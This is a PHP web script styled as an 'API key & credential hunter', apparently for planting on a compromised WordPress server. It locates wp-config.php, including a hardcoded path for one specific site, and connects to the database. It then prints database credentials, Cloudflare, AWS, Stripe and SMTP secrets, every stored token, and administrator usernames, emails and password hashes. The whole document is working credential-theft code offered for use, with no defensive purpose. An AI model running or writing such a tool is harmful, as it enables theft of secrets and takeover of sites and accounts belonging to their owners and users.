<?php
error_reporting(0);
ini_set('display_errors', 0);

echo "<pre style='background:#0a0a0a;color:#0f0;padding:20px;font-family:monospace;font-size:13px;line-height:1.5'>";
echo "=====================================================\n";
echo "       ENI ADVANCED API KEY & CREDENTIAL HUNTER      \n";
echo "=====================================================\n\n";

// Auto-find wp-config.php
$possible_paths = array(
    __DIR__ . '/wp-config.php',
    dirname(__DIR__) . '/wp-config.php',
    dirname(dirname(__DIR__)) . '/wp-config.php',
    isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php' : '',
    '/nas/content/live/govmates/wp-config.php',
);

$found_config = '';
foreach ($possible_paths as $p) {
    if ($p && file_exists($p) && is_readable($p)) {
        $found_config = $p;
        break;
    }
}

if (!$found_config) {
    $dir = __DIR__;
    for ($i = 0; $i < 4; $i++) {
        if (file_exists("$dir/wp-config.php")) {
            $found_config = "$dir/wp-config.php";
            break;
        }
        $dir = dirname($dir);
    }
}

if (!$found_config) {
    die("[!] wp-config.php not found automatically.\n</pre>");
}

echo "[+] Auto-Detected Config: $found_config\n";
$config_code = file_get_contents($found_config);

// 1. Scan wp-config.php directly for API Keys & Constants
echo "\n=====================================================\n";
echo "         📄 API KEYS & CONSTANTS IN WP-CONFIG        \n";
echo "=====================================================\n";

$constants_to_check = array(
    'CLOUDFLARE_API_KEY', 'CLOUDFLARE_EMAIL', 'CF_API_KEY', 'CF_EMAIL', 'CF_TOKEN',
    'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SES_ACCESS_KEY_ID', 
    'AWS_SES_SECRET_ACCESS_KEY', 'AWS_REGION', 'SES_ACCESS_KEY', 'SES_SECRET_KEY',
    'SENDGRID_API_KEY', 'MAILGUN_API_KEY', 'STRIPE_SECRET_KEY', 'RECAPTCHA_SECRET_KEY'
);

foreach ($constants_to_check as $const_name) {
    if (preg_match("/define\s*\(\s*['\"]" . preg_quote($const_name, '/') . "['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/i", $config_code, $match)) {
        echo "FOUND CONSTANT: $const_name = {$match[1]}\n";
    }
}

// Regex hunt for raw AWS Keys / Cloudflare tokens in wp-config.php
if (preg_match_all('/(AKIA[0-9A-Z]{16})/i', $config_code, $matches_akia)) {
    echo "[!] AWS Access Key ID Found: " . implode(', ', array_unique($matches_akia[1])) . "\n";
}

preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $config_code, $m_name);
preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $config_code, $m_user);
preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/i", $config_code, $m_pass);
preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $config_code, $m_host);
preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]\s*;/i', $config_code, $m_prefix);

$db_name   = isset($m_name[1]) ? $m_name[1] : '';
$db_user   = isset($m_user[1]) ? $m_user[1] : '';
$db_pass   = isset($m_pass[1]) ? $m_pass[1] : '';
$raw_host  = isset($m_host[1]) ? $m_host[1] : '127.0.0.1';
$prefix    = isset($m_prefix[1]) ? $m_prefix[1] : 'wp_';

$host = $raw_host;
$port = 3306;
if (strpos($raw_host, ':') !== false) {
    $parts = explode(':', $raw_host);
    $host = $parts[0];
    $port = intval($parts[1]);
}

echo "\n[+] DB Name     : $db_name\n";
echo "[+] DB User     : $db_user\n";
echo "[+] DB Pass     : " . ($db_pass ? $db_pass : "(empty)") . "\n";
echo "[+] DB Host     : $host:$port\n";
echo "[+] Table Prefix: $prefix\n\n";

if (!$db_name || !$db_user) {
    die("[!] Could not parse DB credentials from config file.\n</pre>");
}

$conn = @new mysqli($host, $db_user, $db_pass, $db_name, $port);
if ($conn->connect_error) {
    $conn = @new mysqli('127.0.0.1', $db_user, $db_pass, $db_name, 3306);
    if ($conn->connect_error) {
        die("[!] DB Connection Failed: " . $conn->connect_error . "\n</pre>");
    }
}
echo "[✓] DB Connected Successfully!\n\n";

$tables_res = $conn->query("SHOW TABLES");
if ($tables_res) {
    while ($row = $tables_res->fetch_row()) {
        if (preg_match('/^(.+)options$/i', $row[0], $pm)) {
            $prefix = $pm[1];
            break;
        }
    }
}

function dump_data($data, $indent = 0) {
    $pad = str_repeat("  ", $indent);
    if (is_array($data)) {
        foreach ($data as $k => $v) {
            if (is_array($v) || is_object($v)) {
                echo "{$pad}[$k] =>\n";
                dump_data((array)$v, $indent + 1);
            } else {
                echo "{$pad}[$k] = " . (string)$v . "\n";
            }
        }
    } else {
        echo "{$pad}" . (string)$data . "\n";
    }
}

// 2. Deep LiteSpeed Cache & Cloudflare Config Scan
echo "=====================================================\n";
echo "    ☁️ LITESPEED CACHE & CLOUDFLARE API KEYS HUNT    \n";
echo "=====================================================\n";

$cf_sql = "SELECT option_name, option_value FROM {$prefix}options 
           WHERE option_name LIKE '%cloudflare%' 
              OR option_name LIKE '%cf_%' 
              OR option_name LIKE '%litespeed%' 
              OR option_name LIKE '%cdn%'";
$res = $conn->query($cf_sql);

if ($res && $res->num_rows > 0) {
    while ($row = $res->fetch_assoc()) {
        $name = $row['option_name'];
        $val  = $row['option_value'];
        
        echo "\n▸ Option: [$name]\n";
        $unserialized = @unserialize($val);
        if ($unserialized !== false || $val === 'b:0;') {
            dump_data($unserialized, 1);
        } else {
            $json = @json_decode($val, true);
            if ($json !== null) {
                dump_data($json, 1);
            } else {
                echo "  Value: $val\n";
            }
        }
    }
} else {
    echo "(No explicit Cloudflare/LiteSpeed options found)\n";
}

// 3. Deep All API Keys & Tokens Hunt in Database
echo "\n=====================================================\n";
echo "              🔑 ALL API KEYS & TOKENS               \n";
echo "=====================================================\n";

$key_patterns = array(
    '%api_key%', '%apikey%', '%api_token%', '%token%', '%secret%', '%auth_key%', '%access_key%'
);
$sql_parts = array();
foreach ($key_patterns as $pat) {
    $sql_parts[] = "option_name LIKE '$pat'";
}
$where_clause = implode(' OR ', $sql_parts);

$res = $conn->query("SELECT option_name, option_value FROM {$prefix}options WHERE $where_clause");

if ($res && $res->num_rows > 0) {
    while ($row = $res->fetch_assoc()) {
        $name = $row['option_name'];
        $val  = $row['option_value'];
        
        if (preg_match('/^(siteurl|home|uninstall_plugins|cron|rewrite_rules)/i', $name)) continue;
        
        echo "\n▸ Option: [$name]\n";
        $unserialized = @unserialize($val);
        if ($unserialized !== false || $val === 'b:0;') {
            dump_data($unserialized, 1);
        } else {
            $json = @json_decode($val, true);
            if ($json !== null) {
                dump_data($json, 1);
            } else {
                echo "  Value: $val\n";
            }
        }
    }
} else {
    echo "(No extra API key options found in DB)\n";
}

// 4. Comprehensive SMTP & Mailer Credentials
echo "\n=====================================================\n";
echo "            📧 SMTP & MAILER CREDENTIALS            \n";
echo "=====================================================\n";

$smtp_patterns = array(
    '%smtp%', '%mail%', '%postman%', '%fluent%', '%easy_wp%', '%swpsmtp%', 
    '%smtp_mailer%', '%amazon%', '%aws%', '%ses%'
);
$sql_parts = array();
foreach ($smtp_patterns as $pat) {
    $sql_parts[] = "option_name LIKE '$pat'";
}
$where_clause = implode(' OR ', $sql_parts);

$res = $conn->query("SELECT option_name, option_value FROM {$prefix}options WHERE $where_clause");

if ($res && $res->num_rows > 0) {
    while ($row = $res->fetch_assoc()) {
        $name = $row['option_name'];
        $val  = $row['option_value'];
        
        if (preg_match('/^(active_plugins|uninstall_plugins|mailchimp|woocommerce|contact-form|wp_mail_smtp_debug)/i', $name)) continue;
        
        echo "\n▸ Option: [$name]\n";
        $unserialized = @unserialize($val);
        if ($unserialized !== false || $val === 'b:0;') {
            dump_data($unserialized, 1);
        } else {
            $json = @json_decode($val, true);
            if ($json !== null) {
                dump_data($json, 1);
            } else {
                echo "  Value: $val\n";
            }
        }
    }
}

// 5. Admin Users
echo "\n=====================================================\n";
echo "              👑 ADMIN ACCOUNTS & PASSWORDS          \n";
echo "=====================================================\n";
$sql_admins = "SELECT u.ID, u.user_login, u.user_email, u.user_pass 
               FROM {$prefix}users u 
               JOIN {$prefix}usermeta m ON u.ID = m.user_id 
               WHERE m.meta_key = '{$prefix}capabilities' 
               AND m.meta_value LIKE '%administrator%' LIMIT 20";
$res = $conn->query($sql_admins);
if ($res && $res->num_rows > 0) {
    while ($row = $res->fetch_assoc()) {
        echo "User: {$row['user_login']} | Email: {$row['user_email']} | Hash: {$row['user_pass']}\n";
    }
}

$conn->close();
echo "\n=====================================================\n";
echo "                  [✓] SCAN COMPLETE                  \n";
echo "=====================================================\n";
echo "</pre>";
